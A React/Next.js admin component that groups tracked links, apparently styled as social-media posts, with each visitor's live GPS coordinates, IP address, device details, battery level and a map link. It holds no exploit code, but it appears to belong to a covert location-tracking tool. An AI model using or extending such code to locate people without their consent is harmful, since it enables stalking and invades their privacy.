// components/admin/LinkLocationGroupCard.tsx
"use client";

import React, { useState } from "react";
import Link from "next/link";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { Badge } from "@/components/ui/Badge";
import { Navigation, BarChart2 } from "lucide-react";
import { timeAgo } from "@/lib/utils";
import { formatSocialTitle, isLongCaption } from "@/lib/text-utils";
import { LinkSummaryItem, LiveLocationItem } from "@/hooks/useRealtimeLocations";

interface LinkLocationGroupCardProps {
  link: LinkSummaryItem;
  locations: LiveLocationItem[];
}

export const LinkLocationGroupCard: React.FC<LinkLocationGroupCardProps> = ({
  link,
  locations,
}) => {
  const [showFullCaption, setShowFullCaption] = useState(false);
  const formattedTitle = formatSocialTitle(link.title);
  const hasLongCaption = isLongCaption(link.title);

  return (
    <Card variant="glass" className="p-4 sm:p-5 space-y-3">
      {/* Link Header */}
      <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-3 border-b border-white/10 pb-3">
        <div className="space-y-1.5 min-w-0 flex-1">
          <div className="flex flex-wrap items-center gap-2">
            <h3 className="text-sm font-bold text-white leading-snug break-words">
              {formattedTitle}
            </h3>
            <Badge
              variant="default"
              className="text-[10px] bg-[#FFFC00]/10 text-[#FFFC00] border-[#FFFC00]/30 font-bold shrink-0"
            >
              {link.totalVisitors} {link.totalVisitors === 1 ? "Visitor" : "Visitors"}
            </Badge>
            {link.ogPlatform && link.ogPlatform !== "custom" && (
              <Badge variant="default" className="uppercase text-[10px] bg-white/10 text-white shrink-0">
                {link.ogPlatform}
              </Badge>
            )}
          </div>

          {hasLongCaption && (
            <div className="pt-0.5">
              <button
                type="button"
                onClick={() => setShowFullCaption(!showFullCaption)}
                className="text-[11px] text-amber-500 dark:text-[#FFFC00] hover:underline font-semibold flex items-center gap-1"
              >
                {showFullCaption ? "Hide Full Caption ▲" : "View Full Post Caption ▼"}
              </button>
              {showFullCaption && (
                <div className="mt-2 p-3 rounded-2xl bg-white/5 border border-white/10 text-xs text-white/70 whitespace-pre-wrap max-h-36 overflow-y-auto leading-relaxed">
                  {link.title}
                </div>
              )}
            </div>
          )}

          {link.targetUrl && (
            <p className="text-xs text-white/50 font-mono truncate max-w-lg">
              {link.targetUrl}
            </p>
          )}
        </div>

        <Link href={`/admin/links/${link.id}`} className="shrink-0">
          <Button size="sm" variant="secondary" className="gap-1.5 text-xs">
            <BarChart2 className="w-3 h-3 text-[#FFFC00]" />
            Track Link
          </Button>
        </Link>
      </div>

      {/* Visitors under this link */}
      {locations.length === 0 ? (
        <p className="text-xs text-white/40 py-2">
          No active coordinates transmitted yet for this link.
        </p>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-2.5 pt-1">
          {locations.map((loc) => {
            const gmapsUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
            const dev = loc.deviceInfo || {};
            const devSpecs = [dev.os, dev.browser, dev.battery !== undefined ? `${dev.battery}%` : null]
              .filter(Boolean)
              .join(" • ");

            return (
              <div
                key={loc.sessionId}
                className="p-3 rounded-2xl bg-white/5 border border-white/5 flex items-center justify-between gap-3 text-xs"
              >
                <div className="space-y-0.5 truncate">
                  <p className="font-mono text-[#FFFC00] font-bold truncate">
                    {loc.latitude.toFixed(5)}, {loc.longitude.toFixed(5)}
                  </p>
                  <p className="text-[11px] text-white/70 truncate">
                    {loc.ipAddress} {devSpecs ? `(${devSpecs})` : ""}
                  </p>
                  <p className="text-[10px] text-white/40">
                    Updated {timeAgo(loc.updatedAt)} • ±{Math.round(loc.accuracy || 0)}m
                  </p>
                </div>

                <a href={gmapsUrl} target="_blank" rel="noopener noreferrer" className="shrink-0">
                  <Button size="sm" className="text-[11px] py-1 px-2.5 gap-1">
                    <Navigation className="w-3 h-3" />
                    Maps ↗
                  </Button>
                </a>
              </div>
            );
          })}
        </div>
      )}
    </Card>
  );
};
